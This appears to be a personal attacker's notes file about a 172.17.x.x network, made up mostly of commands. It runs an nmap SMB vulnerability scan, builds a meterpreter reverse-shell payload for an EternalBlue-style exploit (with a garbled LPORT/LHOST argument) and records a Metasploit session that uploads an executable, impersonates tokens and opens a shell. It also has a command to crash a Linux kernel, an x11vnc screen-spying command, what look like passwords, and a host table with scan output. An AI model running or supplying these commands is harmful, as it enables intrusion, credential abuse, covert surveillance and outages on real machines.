```bash
nmap -n -p 445 --script=vuln 172.17.227.65-200
nmblookup -A <ip>
msfvenom --payload windows/meterpreter/reverse_tcp LPORT=172.17.227.104 LPORT=4444 -o shellcode.bin
cat sc_x86_kernel.bin shellcode.bin > sc_x86.bin
./Win7Blue
```

```msfg
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set rhost 172.17.227.65-220
set lhost 172.17.227.104
run
upload lemonlime.exe
use incognito
list_tokens -u
impersonate_token <token>
shell
```

```sh
# 确认 sysrq 已启用
echo 1 > /proc/sys/kernel/sysrq

# 触发 panic
echo c > /proc/sysrq-trigger
```

`pxbakioi%%%orz%%%wtz10.07.19wtzzhy80`

Capture 
```sh
llks -s -m /usr/local/bin/llkk.cnf -o /tmp/xxxxxxxx
su noi -s /bin/sh; x11vnc -viewonly -display :0 -rfbauth ~/.vnc/passwd
```

`Ew2IEOEcEkTD4aBYwukD`

|IP|Port|
|:-:|:-:|
172.17.227.69|TEC1
172.17.227.70|A01
172.17.227.80|B02
172.17.227.83|B05
172.17.227.87|C01
172.17.227.88|C02
172.17.227.92|C06
172.17.227.95|D01
172.17.227.120|D02

```nmap
Nmap scan report for 172.17.226.200
Host is up (0.0011s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
990/tcp   open  ftps
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5357/tcp  open  wsdapi
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
49669/tcp open  unknown
```

172.17.226.220 PXB